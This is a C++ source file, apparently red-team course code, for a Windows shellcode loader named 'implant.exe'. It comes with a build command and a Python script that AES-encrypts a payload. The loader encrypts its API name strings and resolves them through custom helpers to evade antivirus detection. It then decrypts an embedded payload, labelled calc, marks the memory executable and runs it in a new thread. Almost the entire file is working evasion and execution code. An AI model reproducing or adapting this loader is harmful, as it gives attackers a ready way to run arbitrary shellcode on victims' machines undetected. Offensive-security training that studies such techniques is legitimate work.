/*

Based on RTO Course from Sektor 7 Institute. 

https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winmain

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontextw
	https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptographic-provider-types
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash
	https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-crypthashdata
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey
https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-multibytetowidechar


@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp *.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS
del *.obj



 Red Team Operator course code template
 PE binary - payload encryption with AES
 

import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

#KEY = get_random_bytes(16)


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext):

    key =  "\xe5\x66\x24\x89\x2a\xe5\x89\xef\x17\x19\x9e\x73\x30\x58\x42\x4e"
    iv = 16 * b'\x00'
    k = hashlib.sha256(key).digest()
    iv = 16 * '\x00'
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext)

#print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')


DONE:
1) define key and payload (encrypted)
2) winmain with gui trick
3) allocate
4) decrypt
5) move
6) protect
7) create thread
8) waitforsingleobject
9) virtual functions via typedefs
10) encrypt function name strings
getprocaddress helper (resolver)
getmodulehandle helper (resolver)

TODO:



*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "helpers.h"


typedef DWORD  (WINAPI * WaitForSingleObject_t)(HANDLE hHandle,DWORD  dwMilliseconds);
typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T  Length);
typedef HANDLE (WINAPI * CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,  LPTHREAD_START_ROUTINE  lpStartAddress,  __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, unsigned int key_len){

	HCRYPTPROV phProv;
	HCRYPTHASH phHash;
	HCRYPTKEY hKey;

	CryptAcquireContextW(&phProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	CryptCreateHash(phProv, CALG_SHA_256, 0, 0, &phHash);
	CryptHashData(phHash, (BYTE *) key, (DWORD) key_len, 0);
	CryptDeriveKey(phProv, CALG_AES_256, phHash, 0, &hKey);
	CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *)payload, (DWORD *) &payload_len);

	CryptReleaseContext(phProv, 0);
	CryptDestroyHash(phHash);
	CryptDestroyKey(hKey);
	
	return 0;


};

// calc encrypted
unsigned char payload[] = { 0xdb, 0xf7, 0xdb, 0x14, 0x0, 0xb0, 0x34, 0xf6, 0x6, 0xa9, 0xba, 0x4a, 0xb0, 0xd4, 0xe5, 0x65, 0x94, 0xe4, 0x4d, 0x4d, 0x37, 0x19, 0xf4, 0x20, 0xd, 0x51, 0x9b, 0xa2, 0x36, 0xd8, 0x5, 0xcb, 0xf6, 0xed, 0x90, 0x43, 0xd9, 0xf, 0x6d, 0x1b, 0xdf, 0x95, 0x4b, 0x93, 0x8f, 0xbc, 0x1a, 0xf5, 0x8a, 0x90, 0x20, 0x85, 0xbe, 0xe, 0x9e, 0xb7, 0xd9, 0x45, 0x61, 0x53, 0x8d, 0xfc, 0x25, 0x68, 0x40, 0x79, 0x24, 0xaa, 0x5d, 0xe5, 0xaa, 0xcc, 0x66, 0xdd, 0x87, 0xe3, 0x3c, 0x99, 0xbe, 0x4, 0x7e, 0x91, 0xe9, 0xef, 0x9, 0x86, 0x2d, 0xd4, 0x64, 0x56, 0xd5, 0x5a, 0x9c, 0x3e, 0x1a, 0x24, 0x69, 0xd0, 0x7c, 0xba, 0x45, 0xb6, 0xae, 0x66, 0xad, 0x84, 0x28, 0x3, 0xab, 0xa1, 0x59, 0xea, 0xa, 0x62, 0x83, 0x5, 0xd8, 0x46, 0x21, 0xfd, 0x41, 0x1f, 0xae, 0x1c, 0x7, 0xdf, 0x72, 0x8e, 0x37, 0x96, 0xf9, 0x4b, 0xbd, 0xdf, 0x3f, 0x18, 0x37, 0x4b, 0x43, 0x97, 0x94, 0xc2, 0x8d, 0x6, 0x79, 0x2f, 0x47, 0x6, 0xb8, 0x14, 0x27, 0xe5, 0x94, 0x62, 0xd7, 0x4, 0x7e, 0x3d, 0x26, 0x90, 0xba, 0x4b, 0x27, 0x91, 0x92, 0x0, 0xda, 0x59, 0xf4, 0x13, 0xce, 0x54, 0xdf, 0x8, 0xf8, 0x76, 0xd8, 0xfb, 0x9e, 0x4a, 0x45, 0xc8, 0x14, 0xa1, 0xc, 0x97, 0x1f, 0x3a, 0x10, 0xdf, 0x33, 0xf4, 0xf4, 0x36, 0x99, 0x6f, 0xba, 0x9d, 0xb7, 0xf2, 0xd3, 0xb9, 0x70, 0x39, 0xcf, 0x71, 0x1f, 0xe0, 0xbe, 0x33, 0x4f, 0x7, 0x7c, 0x5e, 0x81, 0x55, 0xfd, 0x6, 0x2, 0x97, 0x2d, 0xce, 0x6c, 0x1d, 0xce, 0xc6, 0x92, 0x57, 0xee, 0x8b, 0x6d, 0x69, 0x69, 0x3f, 0x38, 0x47, 0xc6, 0x37, 0xf4, 0xe3, 0x70, 0x8f, 0x8a, 0xaf, 0xeb, 0xe4, 0x82, 0xd0, 0xc7, 0xe9, 0xfc, 0xeb, 0x4, 0xa4, 0x23, 0xda, 0x14, 0x34, 0x1b, 0x38, 0xfe, 0xd6, 0x37, 0xb, 0xac, 0x24, 0xcd, 0x58, 0x97, 0xee, 0x86, 0x8, 0xd7, 0x6a, 0xba, 0x70, 0xad, 0xa4, 0x59, 0x52, 0xd9, 0x4c, 0x88, 0x93, 0xd5, 0x1c, 0xe6, 0xd3 };
unsigned char key[] = { 0xe5, 0x66, 0x24, 0x89, 0x2a, 0xe5, 0x89, 0xef, 0x17, 0x19, 0x9e, 0x73, 0x30, 0x58, 0x42, 0x4e };
unsigned char kernel32[] = { 0xdf, 0x62, 0xc5, 0x47, 0xe9, 0xd3, 0xfe, 0x4c, 0xda, 0x52, 0xc0, 0xb6, 0xe1, 0xb2, 0x65, 0x5f };


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){


	DWORD lpflOldProtect = 0;

	AESDecrypt((char *)kernel32, sizeof(kernel32), (char *)key, sizeof(key));
	kernel32[12] = '\0';

	unsigned char VirtualAllocEnc[] = { 0xae, 0x9a, 0x7a, 0x52, 0x7c, 0xa6, 0xa9, 0x54, 0x86, 0x2a, 0xf, 0x97, 0xca, 0xff, 0xc3, 0x83 };
	AESDecrypt((char *)VirtualAllocEnc, sizeof(VirtualAllocEnc), (char *)key, sizeof(key));
	VirtualAllocEnc[12] = '\0';

	unsigned char VirtualProtectEnc[] = { 0x3b, 0xcf, 0x1b, 0xf1, 0xd8, 0x16, 0xfe, 0x82, 0xdb, 0xc8, 0x50, 0x34, 0xc6, 0xc1, 0xd4, 0x8f };
	AESDecrypt((char *)VirtualProtectEnc, sizeof(VirtualProtectEnc), (char *)key, sizeof(key));
	VirtualProtectEnc[14] = '\0';

	unsigned char CreateThreadEnc[] = { 0x26, 0xd0, 0x9e, 0x57, 0x7, 0x4b, 0xcf, 0x96, 0x98, 0x4d, 0xdd, 0x7e, 0xcf, 0x1, 0x25, 0x2b };
	AESDecrypt((char *)CreateThreadEnc, sizeof(CreateThreadEnc), (char *)key, sizeof(key));
	CreateThreadEnc[12] = '\0';

	unsigned char WaitForSingleObjectEnc[] = { 0x10, 0xd6, 0x4c, 0x9d, 0x95, 0x54, 0xa, 0xf2, 0xb9, 0x10, 0x9a, 0xd4, 0x2e, 0xab, 0x20, 0x59, 0xc6, 0x43, 0xe8, 0x94, 0xd1, 0x7d, 0xe6, 0x8b, 0xf6, 0xa6, 0x7, 0xb7, 0x21, 0xb1, 0x1c, 0x8c };
	AESDecrypt((char *)WaitForSingleObjectEnc, sizeof(WaitForSingleObjectEnc), (char *)key, sizeof(key));
	WaitForSingleObjectEnc[18] = '\0';

	unsigned char RtlMoveMemoryEnc[] = { 0xd, 0x4f, 0xde, 0x32, 0xe5, 0x1e, 0xa8, 0xfc, 0x4a, 0x2, 0xfd, 0x6d, 0x46, 0x8f, 0x3b, 0xea }; //0d bad char?
	AESDecrypt((char *)RtlMoveMemoryEnc, sizeof(RtlMoveMemoryEnc), (char *)key, sizeof(key));
	RtlMoveMemoryEnc[12] = '\0';
	
	LPWSTR kernUnicode[32];

	
	MultiByteToWideChar(CP_OEMCP, 0, (LPCCH) kernel32, sizeof(kernel32), (LPWSTR)kernUnicode, 32);


	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)VirtualAllocEnc);
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), "RtlMoveMemory");
	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)WaitForSingleObjectEnc);
	VirtualProtect_t pVirtualProtect = (VirtualProtect_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)VirtualProtectEnc);
	CreateThread_t pCreateThread = (CreateThread_t) hlpGetProcAddress(hlpGetModuleHandle((LPCWSTR)kernUnicode), (char *)CreateThreadEnc);


	LPVOID memAlloc = pVirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char *)payload, sizeof(payload), (char *)key, sizeof(key));

	pRtlMoveMemory(memAlloc, payload, sizeof(payload));

	pVirtualProtect(memAlloc, sizeof(payload), PAGE_EXECUTE_READ, &lpflOldProtect);

	HANDLE ct = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) memAlloc, 0, 0, 0);

	pWaitForSingleObject(ct, -1);

	return 0;

};

